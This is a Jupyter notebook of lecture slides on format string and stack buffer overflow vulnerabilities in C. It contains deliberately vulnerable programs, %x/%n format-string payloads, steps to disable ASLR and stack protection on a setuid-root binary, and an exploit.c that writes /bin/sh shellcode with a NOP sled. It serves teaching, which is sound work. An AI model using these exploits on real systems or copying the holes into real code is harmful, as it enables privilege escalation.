{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## <center> Format String Vulnerability </center>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Format String\n",
    "\n",
    "- The family of `printf` function (`printf`, `fprintf`, `sprintf`...) allows users to print out a string according to a predefined format. \n",
    "- First argument in this function is called a *format string*. \n",
    "  - Normal characters within this string will be printed out as is. \n",
    "  - Characters preceded with special annocation (`%`) will be formatted according to a predefined conversion specifier. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing source/printf_example.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/printf_example.c\n",
    "#include <stdio.h>\n",
    "\n",
    "int main() \n",
    "{\n",
    "    int i=1, j=2, k=3;\n",
    "\n",
    "    printf(\"Hello World \\n\");\n",
    "    printf(\"Print 1 number:  %d\\n\", i);\n",
    "    printf(\"Print 2 numbers: %d, %d\\n\", i, j);\n",
    "    printf(\"Print 3 numbers: %d, %d, %d\\n\", i, j, k);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -o printf_example Computer-Security/source/printf_example.c\n",
    "$ ./printf_example\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- `printf()` accepts any number of arguments. \n",
    "- https://linux.die.net/man/3/printf\n",
    "- How?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/variable_args.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/variable_args.c\n",
    "#include <stdio.h>\n",
    "#include <stdarg.h>\n",
    "\n",
    "int myprint(int Narg, ... ) \n",
    "{\n",
    "  int i;\n",
    "  va_list ap;                              \n",
    "\n",
    "  va_start(ap, Narg);                      \n",
    "  for(i=0; i<Narg; i++) {\n",
    "    printf(\"%d  \", va_arg(ap, int));       \n",
    "    printf(\"%f\\n\", va_arg(ap, double));    \n",
    "  }\n",
    "  va_end(ap);                              \n",
    "}\n",
    "\n",
    "int main() {\n",
    "  myprint(1, 2, 3.5);                      \n",
    "  myprint(2, 2, 3.5, 3, 4.5);              \n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "```\n",
    "$ gcc -o variable_args Computer-Security/source/variable_args.c\n",
    "$ ./variable_args\n",
    "[11/23/18]seed@VM:~$ ./variable_args\n",
    "2  3.500000\n",
    "2  3.500000\n",
    "3  4.500000\n",
    "[11/23/18]seed@VM:~$\n",
    "```\n",
    "\n",
    "- `va_start()` initiates position of `ap`\n",
    "- `va_arg()` reads and returns the value that `ap` is pointing to, also advances `ap` along the way. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -g -o variable_args Computer-Security/source/variable_args.c\n",
    "$ gdp variable_args\n",
    "gdb-peda$ break 19\n",
    "gdb-peda$ run\n",
    "gdb-peda$ step\n",
    "gdb-peda$ info args\n",
    "gdb-peda$ x/dw Narg\n",
    "gdb-peda$ x/dw Narg + 1\n",
    "gdb-peda$ x/fg Narg + 2\n",
    "gdb-peda$ x/dw Narg + 4\n",
    "gdb-peda$ x/fg Narg + 5\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- `x`: print value at memory position\n",
    "- `d`: integer, signed decimal\n",
    "- `f`: floating point number\n",
    "- `w`: word (four bytes)\n",
    "- `g`: giant word (eight bytes)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/format-string/1.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- `variable_args` hard-coded the types for each argument in `myprint`. \n",
    "- `printf` embeds argument types into the initial string using `format specifies (%)`. \n",
    "  - `printf` scans the format string, prints out each character encountered, until it sees a format specifier. \n",
    "  - `printf` calls `va_arg()`, which returns the corresponding value pointed to by this specifier and advances the pointer to the next argument. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "```\n",
    "int id = 100, age = 25;\n",
    "char *name = \"Bog Smith\";\n",
    "printf(\"ID: %d, Name: %s, Age: %d\\n\", id, name, age);\n",
    "```\n",
    "<center> <img src=\"figure/format-string/2.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- `%d`: Treat the argument as an *int* number (use the decimal form). \n",
    "- `%x`: Treat the argument as an *unsigned int* (use the hexadecimal form). \n",
    "- `%s`: Treat the argument as a *string pointer*. \n",
    "- `%f`: Treat the argument as a *double* number. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Format String with Missing Optional Arguments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/missing_args.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/missing_args.c\n",
    "#include <stdio.h>\n",
    "int main()\n",
    "{\n",
    "  int   id = 100, age = 25;\n",
    "  char *name = \"Bob Smith\";\n",
    "  printf (\"ID: %d, Name: %s, Age: %d\\n\", id, name);    \n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing source/missing_args_v2.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/missing_args_v2.c\n",
    "#include <stdio.h>\n",
    "int main()\n",
    "{\n",
    "  int   id = 100, age = 25;\n",
    "  char *name = \"Bob Smith\";\n",
    "  char *statement = \"ID: %d, Name: %s, Age: %d\\n\"; \n",
    "  printf (statement, id, name);\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "source": [
    "Compile and run the above examples. What is the difference?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/format-string/3.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "**Why is this dangerous?**\n",
    "\n",
    "```\n",
    "printf(user_input)\n",
    "```\n",
    "\n",
    "```\n",
    "sprintf(format, \"%s %s\", user_input, \": %d\");\n",
    "printf(format, program_data);\n",
    "```\n",
    "\n",
    "```\n",
    "sprintf(format, \"%s %s\", getenv(\"PWD\"), \": %d\");\n",
    "printf(format, program_data);\n",
    "```\n",
    "\n",
    "Bad things can happen when you let users provide direct inputs to the format string. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### A Vulnerable Program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/vul_format_string.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/vul_format_string.c\n",
    "#include <stdio.h>\n",
    "\n",
    "void fmtstr()\n",
    "{\n",
    "    char input[100];\n",
    "    int var = 0x11223344;                     \n",
    "    /* print out information for experiment purpose */\n",
    "    printf(\"Target address: %x\\n\", (unsigned) &var);\n",
    "    printf(\"Data at target address: 0x%x\\n\", var);\n",
    "\n",
    "    printf(\"Please enter a string: \");\n",
    "    fgets(input, sizeof(input)-1, stdin);\n",
    "\n",
    "    printf(input); // The vulnerable place\n",
    "\n",
    "    printf(\"Data at target address: 0x%x\\n\",var);\n",
    "}\n",
    "\n",
    "void main() { fmtstr(); }\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/format-string/4.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "\n",
    "```\n",
    "$ gcc -o vul Computer-Security/source/vul_format_string.c\n",
    "$ sudo chown root vul\n",
    "$ sudo chmod 4755 vul\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Attack 1: Crash Program\n",
    "\n",
    "- If we put several format specifiers in our input, we can get printf() to advance the `va_list` pointer to the places beyond the `printf()`'s stack frame. \n",
    "- If this runs into invalid address (nulll pointers, protected memory, virtual addresses not mapped to physical addresses ...), the program will crash.\n",
    "- Try run `vul` with `%s%s%s` as an input. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Attack 2: Print out Data on the Stack\n",
    "\n",
    "- `%x` print out the integer value pointed to by the `va_list` pointer and advanced `va_list` by four bytes. \n",
    "- How can you view what is in the program's memory using `%x` ?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Attack 3: Change Program's Data in Memory\n",
    "\n",
    "- All `printf()`'s format specifiers print out data, except `%n`, which writes the number of characters printed out so far into memory. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/print_args.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/print_args.c\n",
    "#include <stdio.h>\n",
    "int main()\n",
    "{\n",
    "  int   i = 0;\n",
    "  printf (\"Hello World%n\\n\", &i);    \n",
    "  printf (\"Character Count: %d\\n\", i);\n",
    "  return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "When `printf()` encounters `%n`, it does the followings:\n",
    "\n",
    "- get a value pointed to by the va_list pointer,\n",
    "- treat this value as an address, and\n",
    "- write to the memory at that address. \n",
    "\n",
    "If we need to write using `printf()`, the address of the memory needs to be on the stack. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How do we place the desired address onto the stack?\n",
    "\n",
    "- The vul program does print out the address location. \n",
    "- Address randomization is disabled. \n",
    "- We can save out input to a file, then *pipe* this content into `vul`:\n",
    "\n",
    "```\n",
    "$ echo $(printf \"\\x70\\xea\\xff\\xbf\").%x.%x.%x.%x.%x.%n | vul\n",
    "```\n",
    "\n",
    "- Changing the number of `%x` will lead to segmentation fault (`printf` tries to write with `%n` to invalid address)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Replace **0XBFFFF304** with the corresponding output from **Target address**\n",
    "\n",
    "<center> <img src=\"figure/format-string/5.png\" width=\"500\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Attack 4: Change Program's Data to a Specific Value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/strcpy_overflow.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/strcpy_overflow.c\n",
    "#include <string.h>\n",
    "\n",
    "void foo(char *str)\n",
    "{\n",
    "    char buffer[12];\n",
    "\n",
    "    /* The following statement will result in buffer overflow */ \n",
    "    strcpy(buffer, str);\n",
    "}\n",
    "\n",
    "int main()\n",
    "{\n",
    "    char *str = \"This is definitely longer than 12\";    \n",
    "    foo(str);\n",
    "\n",
    "    return 1;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -z execstack -fno-stack-protector -o strcpy_overflow Computer-Security/source/strcpy_overflow.c\n",
    "$ ./strcpy_overflow\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/format-string/6.png\" width=\"700\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Attack 5: Inject Malicious Code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/format-string/7.png\" width=\"400\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- The region above the buffer includes critical values, including the return address and the previous frame pointer. \n",
    "- The consequences of a modified return address (due to buffer overflow) include:\n",
    "  - The new address (virtual address) might not be mapped to any physical address, leading to an invalid return instruction and a crashed program. \n",
    "  - The address might be mapped to a physical address in protected system space, leading to a failed jump and a crashed program. \n",
    "  - The address might be mapped to a physical address that does not contain any valid instruction, leading to a failed return and a crashed program. \n",
    "  - **The address might be mapped to a physical address that happens to contain valid machine instructions, leading to a continuing program with logic different from the original program.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Exploiting a Buffer Overflow Vulnerability\n",
    "\n",
    "- By overflowing a buffer, we can cause the program to crash or run something else. \n",
    "- If the program is privileged, this means *something else* will be run with privilige, leading to potential privilege escalation for *something malicious*. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/stack.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/stack.c\n",
    "/* stack.c */\n",
    "/* This program has a buffer overflow vulnerability. */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int foo(char *str)\n",
    "{\n",
    "    char buffer[100];\n",
    "    printf (\"I am here\");\n",
    "    /* The following statement has a buffer overflow problem */ \n",
    "    strcpy(buffer, str);\n",
    "\n",
    "    return 1;\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char str[400];\n",
    "    FILE *badfile;\n",
    "\n",
    "    badfile = fopen(\"badfile\", \"r\");\n",
    "    fread(str, sizeof(char), 300, badfile);\n",
    "    foo(str);\n",
    "\n",
    "    printf(\"Returned Properly\\n\");\n",
    "    return 1;\n",
    "}\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Clearly, there is a buffer overflow issue.\n",
    "- What needs to be store in `badfile` to expoit this issue?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable countermeasures:\n",
    "```\n",
    "$ sudo sysctl -w kernel.randomize_va_space=0\n",
    "```\n",
    "Include the following flags with your gcc:\n",
    "- `-z execstack`\n",
    "- `-fno-stack-protector`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -o stack -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ sudo chown root stack\n",
    "$ sudo chmod 4755 stack\n",
    "$ echo \"aaaa\" > badfile\n",
    "$ ./stack\n",
    "$ echo \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" > badfile\n",
    "$ ./stack\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How do we know (guess) where the stack frame of `foo()` will be for us to find out where the malicious code is located (and hence set the relevant jump address)?\n",
    "- Fixed starting address of the stack (before countermeasure). \n",
    "- The stack is shallow (good programming practice don't use deeply nested functions). "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Disable the address randomization and then run `mem_layout_print` to see if the addresses for the pointers in stack are changed?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "How can we find the return address without guessing?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Run the followings:\n",
    "```\n",
    "$ gcc -g -o stack_dbg -z execstack -fno-stack-protector Computer-Security/source/stack.c\n",
    "$ rm badfile\n",
    "$ touch badfile\n",
    "$ gdb stack_dbg\n",
    "gdb-peda$ break foo\n",
    "gdb-peda$ run\n",
    "gdb-peda$ print $ebp\n",
    "gdb-peda$ print &buffer\n",
    "gdb-peda$ print ebp - buffer\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- What is 0x6C in decimal?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "The next body of code will need to be modified anytime you retest this program, after going through the debugging process to identify the correct stack position."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting source/exploit.c\n"
     ]
    }
   ],
   "source": [
    "%%writefile source/exploit.c\n",
    "/* exploit.c  */\n",
    "\n",
    "#include <stdlib.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "char shellcode[]=\n",
    "    \"\\x31\\xc0\"             /* xorl    %eax,%eax     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f   */\n",
    "    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f   */\n",
    "    \"\\x89\\xe3\"             /* movl    %esp,%ebx     */\n",
    "    \"\\x50\"                 /* pushl   %eax          */\n",
    "    \"\\x53\"                 /* pushl   %ebx          */\n",
    "    \"\\x89\\xe1\"             /* movl    %esp,%ecx     */\n",
    "    \"\\x99\"                 /* cdq                   */\n",
    "    \"\\xb0\\x0b\"             /* movb    $0x0b,%al     */\n",
    "    \"\\xcd\\x80\"             /* int     $0x80         */\n",
    ";\n",
    "\n",
    "void main(int argc, char **argv)\n",
    "{\n",
    "  char buffer[200];\n",
    "  FILE *badfile;\n",
    "\n",
    "  /* A. Initialize buffer with 0x90 (NOP instruction) */\n",
    "  memset(&buffer, 0x90, 200);\n",
    "\n",
    "  /* B. Fill the return address field with a candidate \n",
    "        entry point of the malicious code - This needs to be changed everytime you run the vulnerable program. \n",
    "        If this does not work, change x80 to a different value and try again. \n",
    "    \n",
    "    */\n",
    "  *((long *) (buffer + 112)) = 0xbfffe968 + 0x16;\n",
    "\t\n",
    "  // C. Place the shellcode towards the end of buffer\n",
    "  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, \n",
    "         sizeof(shellcode));\n",
    "\n",
    "  /* Save the contents to the file \"badfile\" */\n",
    "  badfile = fopen(\"./badfile\", \"w\");\n",
    "  fwrite(buffer, 200, 1, badfile);\n",
    "  fclose(badfile);\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### How serious is this vulnerability?\n",
    "\n",
    "- http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=format+string+\n",
    "- https://www.ibm.com/blogs/psirt/ibm-security-bulletin-format-string-vulnerability-in-ibm-db2-tool-db2support-cve-2018-1566/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Countermeasures"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### General approaches\n",
    "\n",
    "- Safer functions: specification of maximum data length to be copied\n",
    "- Safer dynamic link library: dynamic link to safer libraries (as opposed to calling unsafe functions)\n",
    "- Program static analyzer: warn of code patterns that could lead to buffer overflow\n",
    "- Programming language: self-check against buffer overflow in the language\n",
    "- Compiler: -fno-stack-protector\n",
    "- Operating system: kernel.randomize_va_space"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
